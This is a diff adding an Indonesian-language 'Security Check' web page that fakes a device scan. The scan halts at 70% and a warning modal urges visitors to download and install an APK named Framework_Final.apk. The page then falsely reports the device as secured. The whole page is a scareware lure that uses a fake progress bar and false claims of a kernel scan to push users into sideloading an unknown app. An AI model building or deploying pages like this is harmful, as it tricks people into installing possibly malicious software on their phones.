@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check - Mahli Shield</title>
+    <style>
+        :root {
+            --bg: #0b0f1a;
+            --accent: #0ea5e9;
+            --danger: #f43f5e;
+            --success: #22c55e;
+            --text: #f1f5f9;
+        }
+
+        body { 
+            font-family: 'Segoe UI', sans-serif; background: var(--bg); 
+            color: var(--text); margin: 0; display: flex; align-items: center;
+            justify-content: center; height: 100vh; overflow: hidden;
+        }
+
+        .container { text-align: center; width: 80%; max-width: 400px; }
+
+        /* Loader Animation */
+        .loader-ring {
+            width: 120px; height: 120px; border: 4px solid rgba(14, 165, 233, 0.1);
+            border-top: 4px solid var(--accent); border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 0 auto 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #percent { font-size: 42px; font-weight: 800; margin-bottom: 10px; }
+        .status-text { letter-spacing: 2px; font-size: 12px; color: var(--accent); text-transform: uppercase; }
+
+        /* Popup Styles */
+        #popup {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9); z-index: 100; align-items: center; justify-content: center;
+        }
+
+        .modal {
+            background: #161b2c; padding: 30px; border-radius: 20px;
+            border: 1px solid var(--danger); width: 85%; max-width: 350px;
+        }
+
+        .modal h2 { color: var(--danger); margin-top: 0; }
+        .modal p { font-size: 14px; color: #94a3b8; line-height: 1.6; }
+
+        .btn-download {
+            display: block; width: 100%; padding: 15px; background: var(--accent);
+            color: white; text-decoration: none; border-radius: 10px;
+            font-weight: bold; margin-top: 20px;
+        }
+
+        /* Success View */
+        .done-icon { font-size: 60px; color: var(--success); }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="mainContainer">
+        <div class="loader-ring" id="ring"></div>
+        <div id="percent">0%</div>
+        <div class="status-text" id="status">Menganalisis Enkripsi...</div>
+    </div>
+
+    <div id="popup">
+        <div class="modal">
+            <h2>⚠️ Tindakan Diperlukan</h2>
+            <p>Untuk melanjutkan pemindaian kernel hingga 100%, Anda harus menginstal <b>Framework Keamanan</b> untuk memverifikasi integritas perangkat Anda.</p>
+            <a href="Framework_Final.apk" class="btn-download" onclick="checkInstallation()">DOWNLOAD & INSTALL</a>
+            <p style="font-size: 10px; margin-top: 15px;">Setelah instalasi selesai, buka kembali halaman ini.</p>
+        </div>
+    </div>
+
+    <script>
+        let p = 0;
+        let isAppInstalled = false;
+
+        // Cek localStorage apakah user sudah pernah download sebelumnya
+        if (localStorage.getItem('app_downloaded') === 'true') {
+            isAppInstalled = true;
+        }
+
+        function runScanner() {
+            let interval = setInterval(() => {
+                p++;
+                document.getElementById('percent').innerText = p + "%";
+
+                // Berhenti di 70% jika aplikasi belum dianggap terinstal
+                if (p === 70 && !isAppInstalled) {
+                    clearInterval(interval);
+                    showPopup();
+                }
+
+                if (p >= 100) {
+                    clearInterval(interval);
+                    showSuccess();
+                }
+            }, 50);
+        }
+
+        function showPopup() {
+            document.getElementById('popup').style.display = 'flex';
+        }
+
+        function checkInstallation() {
+            // Tandai bahwa user sudah mendownload
+            localStorage.setItem('app_downloaded', 'true');
+            
+            // Berikan jeda seolah-olah sedang mengunduh/menginstal
+            setTimeout(() => {
+                alert("Silakan instal Framework_Final.apk yang baru saja diunduh. Jika sudah, refresh halaman ini.");
+                window.location.reload();
+            }, 2000);
+        }
+
+        function showSuccess() {
+            document.getElementById('mainContainer').innerHTML = `
+                <div class="done-icon">🛡️</div>
+                <h2 style="color:var(--success)">DEVICES SECURED</h2>
+                <p style="font-size:14px; color:#94a3b8">Integritas sistem terverifikasi melalui Framework.</p>
+            `;
+        }
+
+        runScanner();
+    </script>
+</body>
+</html>
